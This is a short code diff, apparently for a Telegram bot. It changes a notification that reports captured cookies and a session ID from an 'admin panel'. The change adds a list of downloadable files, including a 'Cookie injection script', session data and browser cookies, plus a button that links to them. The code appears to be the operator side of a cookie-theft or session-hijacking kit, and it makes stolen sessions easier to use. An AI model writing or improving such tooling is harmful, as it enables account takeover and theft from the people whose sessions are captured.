@@ -1044,7 +1044,12 @@ ${adminUrl}
 📊 <b>Cookies:</b> ${totalCookies} saved
 🆔 <b>Session:</b> ${sessionId}
 
-🌐 Access admin panel to view details and download cookies
+📥 <b>Downloads Available:</b>
+• Cookie injection script (.js)
+• Session data (.json)
+• Browser cookies (.txt)
+
+🌐 Access admin panel to download files
         `;
 
         // Send notification to all subscribed users
@@ -1055,6 +1060,7 @@ ${adminUrl}
                     reply_markup: {
                         inline_keyboard: [
                             [{ text: '🌐 Open Admin Panel', url: adminUrl }],
+                            [{ text: '📥 View Downloads', url: `${adminUrl}#downloads` }],
                             [{ text: '🔧 Main Menu', callback_data: 'main_menu' }]
                         ]
                     }
